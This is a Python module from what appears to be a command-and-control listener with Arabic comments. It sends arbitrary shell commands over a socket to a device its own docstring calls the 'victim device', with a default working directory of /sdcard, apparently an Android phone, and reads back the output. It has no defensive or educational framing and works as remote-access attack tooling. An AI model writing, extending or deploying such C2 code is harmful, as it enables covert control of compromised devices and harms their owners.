# 📁 c2_listener/commands/shell_executor.py
"""
تنفيذ أوامر Shell عامة
"""

import subprocess
import shlex

class ShellExecutor:
    def __init__(self, session_socket):
        self.socket = session_socket
        self.current_dir = "/sdcard"
    
    def execute(self, command: str) -> dict:
        """تنفيذ أمر shell"""
        
        # معالجة الأوامر الخاصة
        if command.strip() == "pwd":
            return self._send_result(self.current_dir)
        
        elif command.startswith("cd "):
            return self._change_directory(command[3:].strip())
        
        # إرسال الأمر العادي
        return self._send_command(command)
    
    def _change_directory(self, new_dir: str) -> dict:
        """تغيير الدليل الحالي"""
        # هذا تنفيذ وهمي - في الواقع يحتاج إرسال للجهاز
        if new_dir == "..":
            self.current_dir = "/".join(self.current_dir.split("/")[:-1])
        elif new_dir.startswith("/"):
            self.current_dir = new_dir
        else:
            self.current_dir = f"{self.current_dir}/{new_dir}"
        
        return self._send_result(f"تم تغيير الدليل إلى: {self.current_dir}")
    
    def _send_command(self, command: str) -> dict:
        """إرسال أمر للجهاز الضحية"""
        try:
            full_command = f"cd {self.current_dir} && {command}"
            self.socket.send((full_command + "\n").encode())
            
            # استقبال النتيجة
            result = self._receive_with_timeout()
            
            return {
                "success": True,
                "result": result,
                "command": command,
                "directory": self.current_dir
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _send_result(self, result: str) -> dict:
        """إرسال نتيجة مباشرة"""
        return {
            "success": True,
            "result": result,
            "command": "internal",
            "directory": self.current_dir
        }
    
    def _receive_with_timeout(self, timeout: int = 10) -> str:
        """استقبال البيانات مع مهلة"""
        import select
        
        self.socket.settimeout(timeout)
        
        try:
            data = b""
            while True:
                # التحقق من وجود بيانات
                ready = select.select([self.socket], [], [], 0.5)
                if ready[0]:
                    chunk = self.socket.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                else:
                    # لا توجد بيانات جديدة
                    break
            
            return data.decode('utf-8', errors='ignore')
            
        except Exception as e:
            return f"Error receiving data: {e}"